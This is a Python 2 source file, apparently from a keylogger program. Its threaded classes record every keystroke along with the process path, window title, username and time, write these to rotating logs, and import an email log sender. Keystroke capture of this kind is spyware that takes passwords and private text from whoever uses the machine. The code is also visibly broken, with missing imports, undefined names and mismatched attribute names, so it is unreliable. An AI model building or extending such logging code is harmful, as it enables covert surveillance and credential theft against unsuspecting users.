from threading import Thread, Event, RLock
from myutils import _settings, _cmdoptions, OnDemandRotatingFileHandler
from Queue import Queue
from timerthreads import (LogRotator, LogFlusher, OldLogDeleter, LogZipper,
    EmailLogSender)

if os.name == 'posix':
    pass
elif os.name == 'nt':
    import win32api, win32con, win32process
else:
    print "OS is not recognised as windows or linux"
    sys.exit()

'''Event classes have two stages. The thinking is as follows.

The actual hooking routine needs to be /really/ fast, so as not to delay
user input. So it just shoves the event in a Queue and moves on. This
stage happens in the main keylogger class.

The first stage of processing the queue items needs to be /pretty/ fast,
because we need to grab various window attributes or screenshots etc.,
and this needs to happen expeditiously before windows disappear. We then
stick the processed events into another queue.

The second stage of processing can be slow. All it needs to do is
massage the info it receives, and then write it out to disk
in whatever format required.'''

class BaseEventClass(Thread):
    '''This is the base class for event-based threads.
    
    Event-based threads are ones that work off keyboard or mouse events.
    
    These classes are the main "logging" threads.
    Each one gets a Queue as an argument from which it pops off events,
    and a logger name argument which is where the logs go.
    '''
    def __init__(self, event_queue, loggername, *args, **kwargs):
        Thread.__init__(self)
        self.finished = Event()
        
        self.q = event_queue
        self.loggername = loggername
        self.args = args # arguments, if any, to pass to task_function
        self.kwargs = kwargs # keyword args, if any, to pass to task_function
        
        self.subsettings = _settings[loggername]        
    
    def cancel(self):
        '''Stop the iteration'''
        self.finished.set()
        
    def run(self):
        while not self.finished.isSet():
            self.task_function(*self.args, **self.kwargs)
                
    def task_function(self):
        pass # to be overridden in derived classes.


class FirstStageBaseEventClass(BaseEventClass):
    '''Adds system attributes to events from hook queue, and passes them on.
    
    These classes also serve as the "controller" classes, and spawn
    all the related timer-based threads for the logger.'''

    def __init__(self, *args, **kwargs):
        
        BaseEventClass.__init__(self, *args, **kwargs)
        
        self.dir_lock = RLock()
                
        self.create_loggers()
        self.spawn_timer_threads()
    
    def create_loggers(self):
        
        # configure the data logger
        logger = logging.getLogger(self.loggername)
        logpath = os.path.join(_settings['General']['Log Directory'],
                            _settings[loggername]['General']['Log Subdirectory'], 
                                _settings[loggername]['General']['Log Filename'])
        loghandler = OnDemandRotatingFileHandler(logpath)
        loghandler.setLevel(logging.INFO)
        logformatter = logging.Formatter('%(message)s')
        loghandler.setFormatter(logformatter)
        logger.addHandler(loghandler)
    
    def spawn_timer_threads(self):
        self.timer_threads = {}
        for key in _settings[loggername].keys():
            try:
            #if _settings[loggername][key].has_key('_Thread_Class']:
                self.timer_threads[key] = \
                    eval(_settings[loggername][key]['_Thread_Class'] + \
                            '(self.dir_lock, loggername)')
            except KeyError:
                pass # this is not a thread to be started.
    
    def spawn_second_stage_thread(self):
        self.sst_queue = Queue(0)
        self.sst = SecondStageEventClass(self.dir_lock, self.loggername)
        

class SecondStageBaseEventClass(BaseEventClass):
    '''Takes events from queue and writes to disk.
    
    The queue in question is the "secondary" queue passed in from
    the first stage class.
    '''
    
    def __init__(self, dir_lock, *args, **kwargs):
        
        BaseEventClass.__init__(self, *args, **kwargs)
        
        self.dir_lock = dir_lock
                

class DetailedLogWriterFirstStage(FirstStageBaseEventClass):
    '''Standard detailed log writer.
    
    Logs key events, and various attributes of process/window that 
    receive them.
    '''
    
    def __init__(self, *args, **kwargs):
        
        FirstStageBaseEventClass.__init__(self, *args, **kwargs)
        
        self.task_function = self.process_event
        
        self.eventlist = range(7) #initialize our eventlist to something.
        
        if self.subsettings['General']['Log Key Count'] == True:
            self.eventlist.append(7)
    
    def process_event(self):
        try:
            event = self.q.get(timeout=0.2) #need the timeout so that thread terminates properly when exiting
            process_name = self.get_process_name(event)
            loggable = self.needs_logging(event)  # see if the program is in the no-log list.
            if not loggable:
                logging.getLogger('').debug("not loggable, we are outta here\n")
                return
            logging.getLogger('').debug("loggable, lets log it. key: " + str(event.Key))
            
            # try a few different environment vars to get the username
            for varname in ['USERNAME','USER','LOGNAME']:
                username = os.getenv(varname)
                if username is not None:
                    break
            if username is None:
                username = 'none'
                
            eventlisttmp = [myutils.to_unicode(time.strftime('%Y%m%d')), # date
                            myutils.to_unicode(time.strftime('%H%M')), # time
                            myutils.to_unicode(self.GetProcessName(event)).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # process name (full path on windows, just name on linux)
                            myutils.to_unicode(event.Window), # window handle
                            myutils.to_unicode(username).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # username
                            myutils.to_unicode(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]')] # window title
                            
            if self.settings['General']['Log Key Count'] == True:
                eventlisttmp = eventlisttmp + ['1',myutils.to_unicode(self.ParseEventValue(event))]
            else:
                eventlisttmp.append(myutils.to_unicode(self.ParseEventValue(event)))
                
            if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
                self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1] #append char to log
                if self.settings['General']['Log Key Count'] == True:
                    self.eventlist[-2] = str(int(self.eventlist[-2]) + 1) # increase stroke count
            else:
                self.WriteToLogFile() #write the eventlist to file, unless it's just the dummy list
                self.eventlist = eventlisttmp
        except Empty:
            pass #let's keep iterating
        except:
            self.PrintDebug("some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info())
            pass #let's keep iterating
    
    def needs_logging(self, event):
        '''This function returns False if the process name associated with an event
        is listed in the noLog option, and True otherwise.'''
        
        self.process_name = self.get_process_name(event)
        if self.settings['General']['Applications Not Logged'] != 'None':
            for path in self.settings['General']['Applications Not Logged'].split(';'):
                if os.path.exists(path) and os.stat(path) == os.stat(self.processName):  #we use os.stat instead of comparing strings due to multiple possible representations of a path
                    return False
        return True

    def get_process_name(self, event):
        '''Acquire the process name from the window handle for use in the log filename.
        '''
        if os.name == 'nt':
            hwnd = event.Window
            try:
                threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
                
                # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
                
                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
                return procname
            except:
                # this happens frequently enough - when the last event caused the closure of the window or program
                # so we just return a nice string and don't worry about it.
                return "noprocname"
        elif os.name == 'posix':
            return unicode(event.WindowProcName, 'latin-1')
